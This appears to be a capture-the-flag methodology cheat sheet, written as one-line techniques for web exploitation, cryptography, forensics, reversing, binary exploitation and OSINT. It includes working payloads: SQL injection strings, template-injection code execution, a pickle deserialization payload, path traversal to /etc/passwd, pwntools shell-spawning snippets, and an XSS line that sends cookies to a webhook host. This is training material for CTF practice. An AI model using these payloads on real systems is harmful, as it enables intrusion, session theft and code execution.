# CTF Challenge Solving Methodology

## Web Exploitation
- View source (`Ctrl+U`), check HTML comments, hidden form fields, JavaScript files for flags/endpoints
- Check `robots.txt`, `.git/HEAD`, `.env`, `/backup`, `/debug`, `/.well-known/`, `/server-status`
- Cookie manipulation: decode base64/JWT cookies, modify `role=admin`, `isAdmin=true`, flip boolean flags
- SQLi: test `' OR 1=1--`, `' UNION SELECT 1,2,3--`, `" OR ""="`, on every input field and parameter
- SQLi (blind): `' AND (SELECT SUBSTRING(flag,1,1) FROM flags)='f'--` — extract char by char
- XSS to steal admin cookie: `<script>fetch('https://webhook.site/xxx?c='+document.cookie)</script>`
- SSTI: test `{{7*7}}`, `${7*7}`, `<%= 7*7 %>` — if 49 appears, exploit: `{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}`
- Deserialization: PHP `O:4:"User":1:{s:4:"role";s:5:"admin";}`, Python pickle `cos\nsystem\n(S'cat /flag'\ntR.`
- Race condition: `for i in $(seq 1 50); do curl -s https://target/buy & done; wait` — exploit TOCTOU
- Path traversal: `....//....//....//etc/passwd`, `..%252f..%252f..%252fetc/passwd` (double URL encode)
- Directory brute force: `ffuf -u http://target/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302`

## Cryptography
- Identify cipher: `file`, `xxd`, frequency analysis with `dcode.fr`, check for Base64/hex/rot13 first
- Caesar/ROT: `echo "cipher" | tr 'A-Za-z' 'N-ZA-Mn-za-m'` — try all 25 rotations
- RSA small n: `factordb.com` to factor n, then compute `d = pow(e, -1, phi)` and `pow(c, d, n)`
- RSA common modulus: given two ciphertexts with same n but different e, use extended GCD to recover plaintext
- RSA Wiener attack: small d → use `owiener` Python library: `d = owiener.attack(e, n)`
- RSA Hastad broadcast: same plaintext encrypted with e=3 to 3 different n → CRT then cube root
- Padding oracle: `python3 padBuster.py http://target/decrypt?data= <ciphertext_b64> 16 -encoding 0`
- AES-ECB detection: identical 16-byte blocks in ciphertext → ECB mode → byte-at-a-time attack
- Hash length extension: `hash_extender --data "known" --secret-length 16 --append "admin=true" --signature <hash> --format sha256`
- XOR with known plaintext: `python3 -c "import pwn; print(pwn.xor(cipher, b'known_prefix'))"`

## Forensics
- File identification: `file mystery`, `xxd mystery | head`, `binwalk mystery` — find embedded files
- File carving: `binwalk -e mystery.bin` extracts embedded archives, images, files
- Steganography: `steghide extract -sf image.jpg -p ""` (empty password), `zsteg image.png -a`, `stegsolve` for LSB
- Strings: `strings -n 8 file | grep -iE 'flag|ctf|key|pass'` — search for readable flag strings
- PCAP analysis: `tshark -r capture.pcap -Y "http.request" -T fields -e http.host -e http.request.uri`
- PCAP extract files: `tshark -r capture.pcap --export-objects http,exported_files/`
- PCAP follow stream: `tshark -r capture.pcap -z follow,tcp,ascii,0` — reconstruct conversations
- Memory forensics: `volatility -f memory.dmp imageinfo` then `volatility -f memory.dmp --profile=Win7SP1x64 pslist`
- Volatility extract: `volatility -f mem.dmp --profile=X hashdump`, `filescan`, `dumpfiles -Q <offset> -D out/`
- Metadata: `exiftool image.jpg` — check GPS coordinates, author, software, comments for hidden data
- Disk forensics: `fdisk -l disk.img && mount -o loop,offset=$((512*2048)) disk.img /mnt` — mount partition
- PDF analysis: `pdftotext file.pdf -` and `pdf-parser.py -f file.pdf` — check embedded objects/JS

## Reverse Engineering
- Initial recon: `file binary`, `strings binary | grep -i flag`, `checksec binary` (security mitigations)
- Dynamic analysis: `ltrace ./binary`, `strace ./binary` — trace library/system calls
- GDB basics: `gdb ./binary` → `info functions`, `disas main`, `b *0x401234`, `r`, `x/20wx $rsp`
- GDB find flag: `b strcmp` → `r` → `x/s $rdi` and `x/s $rsi` — compare function reveals expected input
- Decompile: Ghidra (`analyzeHeadless` for batch), IDA Free, Binary Ninja — read pseudocode
- angr symbolic execution: `import angr; p=angr.Project('./binary'); s=p.factory.entry_state(); sm=p.factory.simgr(s); sm.explore(find=0x401337, avoid=0x401200)`
- z3 solver for keygens: `from z3 import *; x=BitVec('x',32); s=Solver(); s.add(x*0x1337==0xdeadbeef); s.check(); s.model()`
- Unpack UPX: `upx -d packed_binary` — decompress before analysis
- .NET: `dnSpy` or `ilspy` to decompile C# assemblies
- Python bytecode: `uncompyle6 compiled.pyc > source.py` or `pycdc compiled.pyc`

## Binary Exploitation (Pwn)
- Buffer overflow: `python3 -c "from pwn import *; print(cyclic(200))"` → find offset with `cyclic_find(crash_value)`
- Ret2win: `python3 -c "from pwn import *; p=process('./vuln'); p.sendline(b'A'*offset + p64(win_addr)); p.interactive()"`
- Ret2libc: leak libc address via GOT, calculate `system` and `/bin/sh` offsets, build ROP chain
- ROP chain: `ROPgadget --binary ./vuln --rop` or pwntools `ROP(elf).call('system', [next(elf.search(b'/bin/sh'))])`
- Format string read: `%7$s` reads 7th argument as string pointer — `%p.%p.%p.%p` leaks stack values
- Format string write: `fmtstr_payload(offset, {target_addr: value})` using pwntools
- Shellcode: `shellcraft.sh()` in pwntools → `asm(shellcraft.sh())` — requires NX disabled
- Heap exploitation: use-after-free → tcache poisoning (overwrite fd pointer to target address)
- Pwntools template: `from pwn import *; r=remote('host',port); r.sendlineafter(b'>',payload); r.interactive()`
- Check protections: `checksec ./binary` — NX, ASLR, PIE, canary, RELRO determine exploit strategy

## OSINT
- Reverse image search: `images.google.com`, `tineye.com`, `yandex.com/images` — find original source
- EXIF GPS: `exiftool -gps* photo.jpg` → convert to coordinates → Google Maps
- Geolocation: identify landmarks, street signs, language, sun position, vegetation, driving side
- Username search: `sherlock username` — checks 300+ platforms for account existence
- Wayback Machine: `web.archive.org/web/*/target.com` — find old pages, leaked data, removed content
- DNS history: `securitytrails.com` — historical DNS records reveal old infrastructure
- Social media: check bio, posts, followers, tagged locations, EXIF on uploaded images
- Google dorking: `"flag{" site:pastebin.com`, `"CTF" filetype:txt site:target.com`

## General Tips
- Read the challenge description twice — hints are embedded in the flavor text
- Check HTTP response headers (`X-Flag`, `X-Custom-Header`) for hidden values
- Try `curl -I`, `OPTIONS`, `PUT`, `DELETE` — non-standard methods may reveal functionality
- Base64 decode everything that looks encoded: `echo "data" | base64 -d`
- If stuck, enumerate harder: `dirsearch`, `nikto`, `nuclei` on web; `binwalk -e` on files
- Flag format matters: `grep -rEo 'FLAG\{[^}]+\}|flag\{[^}]+\}|CTF\{[^}]+\}' .`
